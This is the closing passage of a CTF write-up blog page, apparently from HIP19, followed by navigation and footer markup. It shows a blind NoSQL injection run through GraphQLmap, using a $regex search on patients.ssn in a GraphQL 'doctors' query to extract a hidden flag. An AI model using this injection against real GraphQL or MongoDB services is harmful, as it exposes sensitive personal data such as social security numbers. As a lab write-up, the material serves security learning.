+</span><span>}
+</span></code></pre>
+<p>Obviously we scripted the data extraction in Python, the script below will get the last flag : <code>4f537c0a-7da6-4acc-81e1-8c33c02ef3b</code>.</p>
+<p>![NOSQL]({{ site.baseurl }}/images/HIP19/doctors3_nosql.png "NOSQL")</p>
+<p>At that time we were checking if the content of <code>r.json()['data']['doctors']</code> was not empty, in order to abstract the data extraction we now take a check input from the user in order to compare the output.</p>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>GraphQLmap &gt; nosqli
+</span><span>Query &gt; {</span><span style="background-color:#bf616a;color:#2b303b;">doctors(options</span><span>: &quot;</span><span style="color:#a3be8c;">{</span><span style="color:#96b5b4;">\&quot;\&quot;</span><span style="color:#a3be8c;">patients.ssn</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">:1}</span><span>&quot;, </span><span style="background-color:#bf616a;color:#2b303b;">search</span><span>: &quot;</span><span style="color:#a3be8c;">{ </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">patients.ssn</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: { </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">$regex</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">^BLIND_PLACEHOLDER</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">}, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">lastName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">:</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admin</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;"> , </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">firstName</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">:</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admin</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;"> }</span><span>&quot;</span><span style="background-color:#bf616a;color:#2b303b;">){id,</span><span> </span><span style="background-color:#bf616a;color:#2b303b;">firstName</span><span>}}
+</span><span>Check &gt; </span><span style="color:#d08770;">5</span><span>d</span><span style="color:#d08770;">089</span><span>c</span><span style="color:#d08770;">51</span><span>dcab</span><span style="color:#d08770;">2</span><span>d</span><span style="color:#d08770;">0032</span><span>fdd</span><span style="color:#d08770;">08</span><span>d
+</span><span>[</span><span style="background-color:#bf616a;color:#2b303b;">+</span><span>] Data found: </span><span style="color:#d08770;">4</span><span>f</span><span style="color:#d08770;">537</span><span>c</span><span style="color:#d08770;">0</span><span>a</span><span style="color:#d08770;">-7</span><span>da</span><span style="color:#d08770;">6-4</span><span>acc</span><span style="color:#d08770;">-81e1-8</span><span>c</span><span style="color:#d08770;">33</span><span>c</span><span style="color:#d08770;">02</span><span>ef</span><span style="color:#d08770;">3</span><span>b
+</span></code></pre>
+<p>I hope you enjoyed the challenges as I did !<br />
+Feel free to share the blog post ! :)</p>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/ph0wn-ctf/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>Ph0wn CTF 2019 - Smart Devices CTF</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/seamonsterctf/" accesskey="."
+    ><span>UYBHYS - Sea Monster Attack &amp; Defense CTF</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  <!-- Share page -->
+<br>
+
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time> Swissky</a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
